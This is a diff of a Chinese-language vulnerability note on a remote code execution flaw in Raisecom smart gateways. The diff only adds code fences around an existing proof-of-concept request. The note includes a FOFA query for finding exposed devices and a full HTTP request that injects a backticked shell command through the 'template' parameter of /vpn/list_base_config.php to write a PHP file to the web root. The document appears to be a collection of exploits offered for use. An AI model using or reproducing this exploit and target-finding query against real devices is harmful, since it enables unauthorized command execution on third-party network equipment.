@@ -79,6 +79,7 @@ FOFA：body="/images/raisecom/back.gif" && title=="Web user login"
 
 POC/EXP：
 
+```http
 GET /vpn/list_base_config.php?type=mod&parts=base_config&template=%60echo+-e+%27%3C%3Fphp+phpinfo%28%29%3Bunlink%28__FILE__%29%3B%3F%3E%27%3E%2Fwww%2Ftmp%2Fjp.php%60 HTTP/1.1
 Host: 127.0.0.1
 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:125.0) Gecko/20100101 Firefox/125.0
@@ -86,6 +87,8 @@ Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/w
 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
 Accept-Encoding: gzip, deflate, br
 Connection: close
+```
+
 
 ![image-20240814175652003](./.resource/瑞斯康达智能网关RCE漏洞/media/image-20240814175652003.png)
 
